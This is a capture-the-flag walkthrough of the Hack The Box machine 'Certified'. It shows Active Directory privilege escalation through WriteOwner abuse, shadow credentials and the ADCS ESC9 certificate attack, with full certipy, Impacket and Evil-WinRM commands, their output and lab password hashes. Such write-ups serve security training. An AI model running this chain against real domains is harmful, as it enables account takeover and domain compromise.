---
title: HTB: Certified
url: https://0xdf.gitlab.io/2025/03/15/htb-certified.html
date: 2025-03-15T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: htb-certified, hackthebox, ctf, nmap, assume-breach, netexec, bloodhound, bloodhound-ce, bloodhound-python, writeowner, adcs, oweredit-py, dacledit-py, shadow-credential, certipy, esc9, oscp-like-v3
---

![Certified](/img/certified-cover.png)

Ceritified is the first “assume-breach” box to release on HackTheBox. I’m given creds for a low priv user. I’ll find this user has WriteOwner over a group, which I’ll abuse to eventually get access to another user. That user has GenericAll over a user. This enabled the ESC9 attack on ADCS, where I can modify the user’s UPN to get a certificate as administrator.

## Box Info

| Name | [Certified](https://hackthebox.com/machines/certified)  [Certified](https://hackthebox.com/machines/certified) [Play on HackTheBox](https://hackthebox.com/machines/certified) |
| --- | --- |
| Release Date | 02 Nov 2024 |
| Retire Date | 15 Mar 2025 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Certified |
| Radar Graph | Radar chart for Certified |
| First Blood User | 00:04:44[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 00:10:20[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [ruycr4ft ruycr4ft](https://app.hackthebox.com/users/1253217) |
| Scenario | As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09 |

## Recon

### nmap

`nmap` finds many open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.41
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:37 EDT
Nmap scan report for 10.10.11.41
Host is up (0.084s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49686/tcp open  unknown
49708/tcp open  unknown
49731/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5357,5985,9389 -sCV 10.10.11.41
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:39 EDT
Nmap scan report for 10.10.11.41
Host is up (0.084s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-27 17:39:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-10-27T17:40:32+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-27T17:40:33+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-27T17:40:32+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-27T17:40:33+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2024-10-27T17:39:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.86 seconds

```

It’s a modern Windows Host (Windows 10+ / Server 2016+). The domain `certified.htb` shows up in the LDAP results, as does the hostname DC01. I’ll add those to my local `/etc/hosts` file:

```
10.10.11.41 dc01.certified.htb certified.htb

```

### Initial Credentials

This is the first HTB machine where I am a low priv user, judith.mader, with the password “judith09” at the start of the box. This is meant to reflect many real world pentests that start this way. I’ll verify they do work over SMB:

```

oxdf@hacky$ netexec smb certified.htb -u judith.mader -p judith09
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 

```

They do not work for WinRM (unsurprisingly):

```

oxdf@hacky$ netexec winrm certified.htb -u judith.mader -p judith09
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [-] certified.htb\judith.mader:judith09

```

Given that, I’ll want to prioritize things like:
- SMB shares
- Bloodhound (which includes most of the data from LDAP)
- ADCS

### SMB - TCP 445

I’ll use `netexec` to check for shares. As an anonymous user, I’m not allowed to access anything:

```

oxdf@hacky$ netexec smb dc01.certified.htb --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [-] IndexError: list index out of range
SMB         10.10.11.41     445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
oxdf@hacky$ netexec smb dc01.certified.htb -u guest -p '' --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [-] certified.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb dc01.certified.htb -u oxdf -p '' --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [-] certified.htb\oxdf: STATUS_LOGON_FAILURE 

```

As judith.mader, `netexec` works:

```

oxdf@hacky$ netexec smb dc01.certified.htb -u judith.mader -p judith09 --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 

```

These are the standard shares for a Windows domain controller, but there’s nothing of interest in them.

### Bloodhound

#### Collection

I’m using the [Community Edition](https://specterops.io/bloodhound-community-edition/) of Bloodhound, which requires a different collector. I’ll use [Bloodhound.py](https://github.com/dirkjanm/BloodHound.py), which at the time of Certified’s release supports CE via a different branch. To get this branch installed, I’ll:
- clone the repo to my host (`git clone https://github.com/dirkjanm/BloodHound.py.git`);
- `cd BloodHound.py` to go into that directory;
- checkout the CE branch with `git checkout bloodhound-ce`;
- install the repo as a standalone Python application using [pipx](https://github.com/pypa/pipx) by running `pipx install .`:

```

oxdf@hacky$ pipx install . --force
Installing to existing venv 'bloodhound'
  installed package bloodhound 1.7.2, installed using Python 3.12.3
  These apps are now globally available
    - bloodhound-python
done! ✨ 🌟 ✨ 

```

Now I have access to the `bloodhound-python` command, which can collect the data:

```

oxdf@hacky$ bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 15S
INFO: Compressing output into 20241027083516_bloodhound.zip

```

#### Setup

The [Community Edition](https://specterops.io/bloodhound-community-edition/) of Bloodhound runs from a Docker container, which is very nice for avoiding installing Neo4j and other dependencies. To start it, I’ll use this command from the [getting started page](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose):

```

curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up

```

I added the `BLOODHOUND_PORT=8888` to have the web interface run on 8888 rather than 8080, where my Burp is currently listening (even if I don’t need it on this box).

When this runs, it will start up multiple containers, and print out an initial password:

![image-20241027144431948](/img/image-20241027144431948.png)

I’ll note that for the login. Once it runs, I’ll visit `localhost:8888` in my browser and get a login screen. After logging in (and having to set a new password), I’ll go to the gear icon at the top right, and then “Administration” –> “File Injest”, and upload the zip archive from above.

#### Analysis

I’ll find judith.mader and mark them as owned. Then I’ll look go to the data about the user on the right and scroll down to “Outbound Object Control”. Clicking on it adds another node:

![image-20241027145542883](/img/image-20241027145542883.png)

They have `WriteOwner` On the Management group. Tracing out this group the same way, I’ll find it has `GenericWrite` over the Management\_SVC user, who has `GenericAll` over the CA\_Operator user. If I go to “PathFinding” at the top right and enter judith.mader to CA\_Operator, it shows the full path:

![image-20241027145406785](/img/image-20241027145406785.png)

### ADCS

It’s always worth taking a look at Active Directory Certificate Services (ADCS). [Certipy](https://github.com/ly4k/Certipy) is a nice tool to do that from my VM. I’ll use the `find` command along with the `-vulnerable` flag and the creds to look for vulnerable certificate templates that judith.mader can abuse:

```

oxdf@hacky$ certipy find -vulnerable -u judith.mader -p judith09 -dc-ip 10.10.11.41 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

```

It gives information about the CA itself, but doesn’t show templates, as there are none that are exploitable from judith.mader.

## Shell as Management\_SVC

### Add Judith.Mader to Management

#### Identify Path

Clicking on the edge in Bloodhound from Judith.Mader to the Management group, there’s a section for Linux Abuse:

[![image-20241027150909038](/img/image-20241027150909038.png)*Click for full size image*](/img/image-20241027150909038.png)

This shows how to modify the owner of the group, then grant the “AddMember” permission, and then add a user to the group.

#### Modify Owner

I’ll use an [Impacket](https://github.com/SecureAuthCorp/impacket) example script, `owneredit.py` to modify the owner. I’ve installed Impacket with `pipx` as well, so all the example scripts are just in my path and can be run directly.

The syntax for `owneredit.py` is slightly different from what Bloodhound shows, but close enough to get it working:

```

oxdf@hacky$ owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!

```

I did get an error at first that looked like this:

```

oxdf@hacky$ owneredit.py -new-owner judith.mader -target management -action write certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies                                                  

[-] unsupported hash type MD4

```

Some searching showed that this issue could be fixed with [these instructions](https://x.com/an0n_r0/status/1545348754789777409?lang=en) (even though I’m not using Kali).

#### Modify Rights

Next I need to give judith.mader the rights to add users:

```

oxdf@hacky$ dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20241027-152313.bak
[*] DACL modified successfully!

```

There is a cleanup script resetting the status of things, so if this fail for permissions issues, I’ll just re-run the previous command.

#### Add to Management

Next I’ll use the `net` binary to add judith.mader to the Management group:

```

oxdf@hacky$ net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41

```

This command doesn’t return anything. I can check the group members with another `net` command:

```

oxdf@hacky$ net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
CERTIFIED\judith.mader
CERTIFIED\management_svc

```

The user configuration is getting reset periodically. In case I get hit by the reset, I’ll keep those four commands handy:

```

owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41

```

### Get NTLM for Management\_SVC

#### Abuse Info

Again, Bloodhound shows how to abuse this from Linux:

![image-20241027153036590](/img/image-20241027153036590.png)

It suggests either a Targeted Kerberoast, or a Shadow Credential. I like Shadow Credentials here, so I’ll go with that.

#### Add Shadow Credential

The abuse information shows using [pywhisker](https://github.com/ShutdownRepo/pywhisker), but I’ll use `certipy`:

```

oxdf@hacky$ certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '91c77677-13a9-3225-4533-8a5ec50d7c90'
[*] Adding Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584

```

This prints out the NTLM hash for the management\_svc account.

### WinRM

#### Check Hash

With that hash, I’ll check that it works for SMB:

```

oxdf@hacky$ netexec smb certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 

```

It works for WinRM as well:

```

oxdf@hacky$ netexec winrm certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)

```

The Bloodhound data shows this as well:

![image-20250311195108579](/img/image-20250311195108579.png)

#### Shell

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell on Certified:

```

oxdf@hacky$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>

```

And on the desktop get `user.txt`:

```
*Evil-WinRM* PS C:\Users\management_svc\desktop> type user.txt
5b5f382a************************

```

## Auth as CA\_Operator

### Enumeration

#### Users

There are not any other users besides administrator with home directories on the box:

```
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/27/2024  10:37 AM                Administrator
d-----        5/13/2024   9:00 AM                management_svc
d-r---        5/13/2024   7:53 AM                Public

```

There’s no interesting files in `management_svc` or any other home directory that management\_svc can access.

#### ADCS

I’ll run `certipy` as management\_svc to look for vulnerable templates, but the output is exactly the same as the previous run with judith.mader:

```

oxdf@hacky$ certipy find -vulnerable -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -stdout 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

```

### Shadow Credential

#### Get NTLM

I already found above that the management\_svc user has `GenericAll` over the CA\_Operator user. I can use the same attack as above, writing a Shadow Credential to get the NTLM hash of this user:

```

oxdf@hacky$ certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290'
[*] Adding Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2

```

#### Validate

The hash works:

```

oxdf@hacky$ netexec smb dc01.certified.htb -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2

```

But not for WinRM:

```

oxdf@hacky$ netexec winrm dc01.certified.htb -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [-] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2

```

## Shell as administrator

### Enumerate ADCS

I’ll run the same `certipy` command again, this time as ca\_operator, and this time the results are different:

```

oxdf@hacky$ certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension

```

There’s a template named CertifiedAuthentication that is vulnerable to ESC9.

### ESC9 Background

[This page](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7) talks about the background for ESC9. ESC9 requires three conditions:
- `StrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag
- Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
- Certificate specifies any client authentication EKU

The attacker also needs to have access to an account that has `GenericWrite` over the another account.

The attack from here is to change the `userPrincipalName` (or UPN) of the second account to `Administrator`. This is explicitly not `Administrator@domain`, as that would conflict with the legit administrator account.

When I request a certificate as the second account, the server will return one with the UPN `Administrator` and no SID.

When I use this certificate, Windows is nice enough to assume that domain is it’s domain, and authenticate as administrator.

### Exploit ESC9

To exploit ESC9, I’ll abuse my access to the management\_svc account that has `GenericAll` over the ca\_operator account, using it to change the `userPrincipalName` of ca\_operator to be Administrator:

```

oxdf@hacky$ certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'

```

Now I’ll request a certificate as ca\_operator using the vulnerable template:

```

oxdf@hacky$ certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

I’ll note that the UPN is Administrator and there’s no SID in the certificate. After this step, I’ll cleanup by changing ca\_operator’s upn back to what it was:

```

oxdf@hacky$ certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

```

This is more than just for OPSEC. Leaving this will lead to failure. It’s not 100% clear to me why at this point.

I’ll use the certificate to get the administrator’s NTLM hash:

```

oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

```

### Shell

The NLTM hash is all I need to get a shell over Evil-WinRM as administrator:

```

oxdf@hacky$ evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
                                        
